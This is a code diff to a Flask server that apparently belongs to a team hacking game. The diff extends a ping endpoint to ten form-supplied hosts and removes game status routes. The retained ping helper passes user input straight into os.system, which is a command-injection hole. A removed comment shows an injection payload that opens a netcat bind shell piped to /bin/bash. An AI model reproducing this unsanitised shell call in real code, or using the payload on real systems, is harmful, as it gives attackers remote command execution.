@@ -1,3 +1,4 @@
+#!/usr/bin/python
 from flask import Flask, render_template, request, jsonify, redirect, session, flash, make_response
 import os
 import json
@@ -75,13 +76,21 @@ def hq_coms():
     host4 = request.form['server4']
     host5 = request.form['server5']
     host6 = request.form['server6']
+    host7 = request.form['server7']
+    host8 = request.form['server8']
+    host9 = request.form['server9']
+    host10 = request.form['server10']
     return jsonify({
         'reachable1': [host1, ping(host1)],
         'reachable2': [host2, ping(host2)],
         'reachable3': [host3, ping(host3)],
         'reachable4': [host4, ping(host4)],
         'reachable5': [host5, ping(host5)],
-        'reachable6': [host6, ping(host6)]
+        'reachable6': [host6, ping(host6)],
+        'reachable7': [host7, ping(host7)],
+        'reachable8': [host8, ping(host8)],
+        'reachable9': [host9, ping(host9)],
+        'reachable10': [host10, ping(host10)]
     })
 
 
@@ -115,59 +124,10 @@ def ansible_playbook4():
     return redirect('/')
 
 
-"""
-    Statuses
-"""
-# curl 127.0.0.1/ping_status/8.8.8.8; nc -l 4004 | /bin/bash &;
-@app.route('/ping_status/<ip>', methods=['POST'])
-def ping_status():
-    return jsonify({
-        'reachable': ping(request.data)
-    })
-
-@app.route("/status/alerts")
-def alerts():
-    return jsonify({'status': 200, 'alerts': ['Perk5 will be unavailable for 10 minutes', 'Alert 3']})
-
-
-@app.route('/status/koth')
-def koth():
-    return jsonify({'status': 200, 'planets': {'planet1': 'team4', 'planet2': 'team1'}})
-
-
-"""
-        Team Functions
-"""
-@app.route('/credits/<teamID>', methods=['POST'])
-def getCredits(teamID):
-    if not validateteamID(teamID):
-        return jsonify({'status': 404})
-    return jsonify({'status': 200, 'credits': 50000})
-
-
-@app.route('/stats/<teamID>', methods=['POST'])
-def getStats(teamID):
-    if not validateteamID(teamID):
-        return jsonify({'status': 404})
-    return jsonify({'status': 200, 'health': '+50%', 'damage': '100%', 'speed': '-100%'})
-
-
-@app.route('/ships/<teamID>', methods=['POST'])
-def getShips(teamID):
-    if not validateteamID(teamID):
-        return jsonify({'status': 404})
-    return jsonify({'status': 200, 'ship1_count': 50, 'ship2_count': 0, 'ship3_count': 1000})
-
 
 """
         Helpers
 """
-def validateteamID(team_id):
-    if team_id is None:
-        return False
-    return True
-
-
 def ping(host):
     response = os.system("ping -n 1 " + host)
     if response == 0:
